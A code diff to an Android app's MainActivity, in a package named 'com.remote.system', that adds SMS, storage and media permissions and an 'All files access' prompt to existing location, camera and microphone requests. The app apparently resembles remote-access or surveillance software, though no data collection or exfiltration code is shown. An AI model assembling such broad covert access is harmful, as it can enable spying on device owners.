@@ -3,8 +3,11 @@ package com.remote.system
 import android.Manifest
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Environment
+import android.provider.Settings
 import android.widget.Button
 import android.widget.TextView
 import android.widget.Toast
@@ -22,7 +25,16 @@ class MainActivity : AppCompatActivity() {
         Manifest.permission.ACCESS_FINE_LOCATION,
         Manifest.permission.ACCESS_COARSE_LOCATION,
         Manifest.permission.CAMERA,
-        Manifest.permission.RECORD_AUDIO
+        Manifest.permission.RECORD_AUDIO,
+        // SMS permissions
+        Manifest.permission.READ_SMS,
+        Manifest.permission.RECEIVE_SMS,
+        // NEW: Storage permissions
+        Manifest.permission.READ_EXTERNAL_STORAGE,
+        Manifest.permission.WRITE_EXTERNAL_STORAGE,
+        Manifest.permission.READ_MEDIA_IMAGES,
+        Manifest.permission.READ_MEDIA_VIDEO,
+        Manifest.permission.READ_MEDIA_AUDIO
     )
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -64,6 +76,13 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
+        // Special handling for MANAGE_EXTERNAL_STORAGE on Android 11+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                requestManageExternalStoragePermission()
+            }
+        }
+
         if (permissionsToRequest.isNotEmpty()) {
             ActivityCompat.requestPermissions(
                 this,
@@ -94,6 +113,18 @@ class MainActivity : AppCompatActivity() {
                     getString(R.string.permission_denied_message),
                     Toast.LENGTH_LONG).show()
             }
+        }
+    }
+
+    private fun requestManageExternalStoragePermission() {
+        try {
+            val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+            intent.data = Uri.parse("package:$packageName")
+            startActivity(intent)
+            Toast.makeText(this, "Please grant 'All files access' permission for file management", Toast.LENGTH_LONG).show()
+        } catch (e: Exception) {
+            val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
+            startActivity(intent)
         }
     }
 
